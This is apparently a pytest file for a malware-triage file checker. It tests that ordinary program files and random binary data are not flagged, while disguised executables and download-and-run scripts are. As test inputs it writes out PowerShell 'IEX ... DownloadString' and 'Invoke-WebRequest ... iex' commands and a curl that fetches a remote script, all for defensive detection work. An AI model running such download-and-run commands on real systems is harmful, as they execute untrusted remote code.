"""False alarms on ordinary files (2026-11-13), each kept as a test so it cannot come back."""
import os

from zbtriage import filecheck as fc

MZ = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00" + b"PE\x00\x00" + b"\x00" * 200


def _rec(tmp_path, name, data):
    path = tmp_path / name
    path.write_bytes(data)
    return fc.fc_examine(str(path))


def test_ordinary_program_extensions_are_not_disguises(tmp_path):
    for name in ("ops.cp311-win_amd64.pyd", "WSTPager.ax", "ipc.node", "shell32.dll.mui", "bootx64.efi"):
        assert not _rec(tmp_path, name, MZ)["disguised"], name


def test_a_program_named_like_a_document_is_still_a_disguise(tmp_path):
    for name in ("invoice.pdf", "photo.jpg", "contract.docx", "video.mp4"):
        rec = _rec(tmp_path, name, MZ)
        assert rec["disguised"] and rec["level"] == fc.FC_LOOK, name


def test_random_letters_in_binary_data_are_not_a_download_and_run_command(tmp_path):
    noise = os.urandom(3000)
    data = noise + b"\x01\x02iEx\x03\x04" + noise + b"\x05iWR=Z\x06" + noise + b"\x07irm?b\x08" + noise
    rec = _rec(tmp_path, "save262.whs", data)
    assert not rec["script"] and rec["level"] == fc.FC_CLEAN


def test_a_real_download_and_run_command_is_found_on_one_line_or_across_lines(tmp_path):
    one = _rec(tmp_path, "notes.txt", b"run this: powershell IEX (New-Object Net.WebClient).DownloadString('http://x')")
    assert any("downloads something and runs it" in s for s in one["script"])
    several = _rec(tmp_path, "setup.ps1", b"$u = 'http://x/p.ps1'\r\n$c = Invoke-WebRequest $u\r\niex $c.Content\r\n")
    assert any("downloads something and runs it" in s for s in several["script"])


def test_a_text_file_that_mentions_curl_and_an_address_is_not_a_script(tmp_path):
    for name in ("repo_by_url.md", "ca-bundle.crt", "20261010T160804Z.log"):
        rec = _rec(tmp_path, name, b"## Find updated version\ncurl --location \"https://example.org/x\" -o y\n")
        assert not rec["script"] and rec["level"] == fc.FC_CLEAN, name


def test_a_shell_script_that_downloads_is_still_worth_a_look(tmp_path):
    rec = _rec(tmp_path, "install.sh", b"#!/bin/sh\ncurl -s http://example.org/x.sh -o /tmp/x.sh\n")
    assert rec["script"] and rec["level"] == fc.FC_LOOK
